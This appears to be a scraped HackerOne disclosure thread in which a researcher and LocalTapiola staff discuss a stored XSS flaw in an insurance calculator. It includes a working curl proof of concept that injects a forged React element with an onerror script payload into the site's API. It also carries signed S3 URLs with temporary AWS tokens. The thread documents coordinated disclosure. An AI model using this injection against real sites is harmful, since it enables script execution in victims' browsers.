d4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=9535b3f4c0eb1fb5adcfb60b5346089acfdbd1df544174c3029e2ddcf6703910","file_size":78509,"type":"image/png"},{"id":94022,"file_name":"Screen_Shot_2016-05-15_at_23.00.25.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.00.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.00.25.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042732Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=e53c9283412fd083ccbc20d8ecc9b88ff2c55b8cd310cf8c6604cbe7bf653118","file_size":209565,"type":"image/png"}],"allow_singular_disclosure_at":"2016-07-27T22:26:59.513Z","allow_singular_disclosure_after":-139557632.63151973,"singular_disclosure_allowed":true,"vote_count":26,"voters":["fransrosen","jobert","michiel","mashoud1122","bogdantcaciuc","zephrfish","r3y","malcolmx","lars","jens","and 16 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":958582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-16T06:20:48.698Z","updated_at":"2016-05-16T06:20:48.698Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":969898,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A quick update on this one. We have forwarded your finding to the 3rd party responsible for this service and we are awaiting their response. Please have patience while we are investigating.","markdown_message":"\u003cp\u003eA quick update on this one. We have forwarded your finding to the 3rd party responsible for this service and we are awaiting their response. Please have patience while we are investigating.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-23T12:30:43.252Z","updated_at":"2016-05-23T12:30:43.252Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994538,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @fransrosen . A fix for this report has been issued and injecting malicious content is not possible anymore. There is a low risk injection possibility still in the application. We will not accept any reports on that issue, as it is known and accepted risk. Bounty decisions will be made next Monday and we can have full disclosure at that point. We would appreciate if you can verify the fix from your point of view also.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/fransrosen\"\u003e@fransrosen\u003c/a\u003e . A fix for this report has been issued and injecting malicious content is not possible anymore. There is a low risk injection possibility still in the application. We will not accept any reports on that issue, as it is known and accepted risk. Bounty decisions will be made next Monday and we can have full disclosure at that point. We would appreciate if you can verify the fix from your point of view also.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T09:16:32.976Z","updated_at":"2016-06-01T09:16:32.976Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994686,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nIs the fix actually deployed? I was able to reproduce the issue again.\n\nPoC-link: https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nI first ran this command:\n```\ncurl -i -s -k  -X 'POST' \\\n    -H 'Content-Type: application/json' \\\n    -b 'caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789' \\\n    --data-binary $'{\\\"79rtwta5z4hjkn3npvu5ak0521\\\":{\\\"postCode\\\":{\\\"isValid\\\":true,\\\"error\\\":{\\\"_store\\\":{},\\\"type\\\":\\\"body\\\",\\\"props\\\":{\\\"dangerouslySetInnerHTML\\\":{\\\"__html\\\":\\\"\u003cimg src=x onerror=alert(document.domain)\u003e\\\"}},\\\"_isReactElement\\\":true},\\\"value\\\":\\\"jjj\\\"},\\\"dateOfIntroduction\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"JAJAJA\\\"},\\\"cylinderCapacity\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"yyy\\\"},\\\"manufacturerCode\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"zzz\\\"},\\\"netPower\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"bbb\\\"},\\\"birthDate\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"11.11.2011xxx\\\"},\\\"grossWeight\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"ccc\\\"},\\\"carType\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"x\\\"},\\\"isRentedOrLeased\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"eee\\\"},\\\"registrationPart2\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"fff\\\"},\\\"modelCode\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"ggg\\\"},\\\"registrationPart1\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"hhh\\\"}}}' \\\n    'https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/'\n```\n\nThe ID I got back, I then used in the following link:\n```\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/XXX\n```\nwhere XXX is the ID I got. As I see it, I'm still able to inject the arbitrary elements into the JSON located here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nCheers,\nFrans","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nIs the fix actually deployed? I was able to reproduce the issue again.\u003c/p\u003e\n\n\u003cp\u003ePoC-link: \u003ca title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" href=\"/redirect?url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F%23%2Fcontinue%2Fbcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI first ran this command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -s -k  -X \u0026#39;POST\u0026#39; \\\n    -H \u0026#39;Content-Type: application/json\u0026#39; \\\n    -b \u0026#39;caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789\u0026#39; \\\n    --data-binary $\u0026#39;{\\\u0026quot;79rtwta5z4hjkn3npvu5ak0521\\\u0026quot;:{\\\u0026quot;postCode\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:{\\\u0026quot;_store\\\u0026quot;:{},\\\u0026quot;type\\\u0026quot;:\\\u0026quot;body\\\u0026quot;,\\\u0026quot;props\\\u0026quot;:{\\\u0026quot;dangerouslySetInnerHTML\\\u0026quot;:{\\\u0026quot;__html\\\u0026quot;:\\\u0026quot;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt;\\\u0026quot;}},\\\u0026quot;_isReactElement\\\u0026quot;:true},\\\u0026quot;value\\\u0026quot;:\\\u0026quot;jjj\\\u0026quot;},\\\u0026quot;dateOfIntroduction\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;JAJAJA\\\u0026quot;},\\\u0026quot;cylinderCapacity\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;yyy\\\u0026quot;},\\\u0026quot;manufacturerCode\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;zzz\\\u0026quot;},\\\u0026quot;netPower\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;bbb\\\u0026quot;},\\\u0026quot;birthDate\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;11.11.2011xxx\\\u0026quot;},\\\u0026quot;grossWeight\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;ccc\\\u0026quot;},\\\u0026quot;carType\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;x\\\u0026quot;},\\\u0026quot;isRentedOrLeased\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;eee\\\u0026quot;},\\\u0026quot;registrationPart2\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;fff\\\u0026quot;},\\\u0026quot;modelCode\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;ggg\\\u0026quot;},\\\u0026quot;registrationPart1\\\u0026quot;:{\\\u0026quot;isValid\\\u0026quot;:true,\\\u0026quot;error\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;value\\\u0026quot;:\\\u0026quot;hhh\\\u0026quot;}}}\u0026#39; \\\n    \u0026#39;https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe ID I got back, I then used in the following link:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/XXX\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewhere XXX is the ID I got. As I see it, I\u0026#39;m still able to inject the arbitrary elements into the JSON located here:\u003cbr\u003e\n\u003ca title=\"https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" href=\"/redirect?url=https%3A%2F%2Fverkkopalvelu.lahitapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2Fapi%2Fvehicle%2Flink%2Fcontinue%2Fbcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nFrans\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T12:44:28.647Z","updated_at":"2016-06-01T12:44:28.647Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":994687,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just for clarity, could you post screenshots of your findings?","markdown_message":"\u003cp\u003eJust for clarity, could you post screenshots of your findings?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T12:46:31.177Z","updated_at":"2016-06-01T12:46:31.177Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994692,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Absolutely!\nI've attached two images, one showing the payload with the extended JSON-elements, used for the attack, the other one showing what happens when I visit:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nRegards,\nFrans\n","markdown_message":"\u003cp\u003eAbsolutely!\u003cbr\u003e\nI\u0026#39;ve attached two images, one showing the payload with the extended JSON-elements, used for the attack, the other one showing what happens when I visit:\u003cbr\u003e\n\u003ca title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" href=\"/redirect?url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F%23%2Fcontinue%2Fbcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nFrans\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T12:48:21.777Z","updated_at":"2016-06-01T12:48:21.777Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":97288,"filename":"Screen_Shot_2016-06-01_at_14.42.25.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/288/488d72443ff3eaf714229ad0f45cb7d5da04e917/Screen_Shot_2016-06-01_at_14.42.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-06-01_at_14.42.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-06-01_at_14.42.25.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042732Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=49a4788620df04c8f3c98b16c81501df910a0093e40194cbfde4e8b02e01fde2"},{"id":97289,"filename":"Screen_Shot_2016-06-01_at_14.47.02.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/289/afe5fcc2c2a4dc7d5b3ba30905b435eb5e8907a0/Screen_Shot_2016-06-01_at_14.47.02.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-06-01_at_14.47.02.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-06-01_at_14.47.02.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042732Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=05cc2030b564ab35e5b90cf960d35c007207338ba0180ef532f8e83871f5d836"}],"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":994693,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To be clear - there is still in injection issue, but your should not be able to inject any malicious code and trigger javascript/xss.","markdown_message":"\u003cp\u003eTo be clear - there is still in injection issue, but your should not be able to inject any malicious code and trigger javascript/xss.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T12:48:34.483Z","updated_at":"2016-06-01T12:48:34.483Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994695,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, will send this back to the team.","markdown_message":"\u003cp\u003eThanks, will send this back to the team.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T12:49:10.478Z","updated_at":"2016-06-01T12:49:10.478Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":995612,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry - this was my bad I misread the test results. This fix is NOT deployed to production yet. I will of course keep you up to date when that actually happens.","markdown_message":"\u003cp\u003eSorry - this was my bad I misread the test results. This fix is NOT deployed to production yet. I will of course keep you up to date when that actually 